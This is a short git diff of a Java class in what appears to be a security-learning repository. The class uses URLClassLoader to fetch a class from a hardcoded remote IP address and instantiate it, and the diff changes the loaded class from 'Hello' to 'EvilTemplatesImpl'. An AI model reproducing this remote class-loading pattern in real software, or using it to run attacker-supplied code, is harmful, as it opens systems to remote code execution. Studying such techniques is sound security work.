@@ -1,4 +1,4 @@
-package com.xjjlearning.hack.java.classfile.classloader;
+package com.xjjlearning.hack.java.classloader;
 
 import java.net.URL;
 import java.net.URLClassLoader;
@@ -10,7 +10,7 @@ public class HelloClassLoader {
     private void loadClass() throws Exception{
         URL[] urls = {new URL("http://47.95.7.37:9870/greet/")};
         URLClassLoader classLoader = new URLClassLoader(urls);
-        Class<?> clazz = classLoader.loadClass("Hello");
+        Class<?> clazz = classLoader.loadClass("EvilTemplatesImpl");
         clazz.newInstance();
     }
 
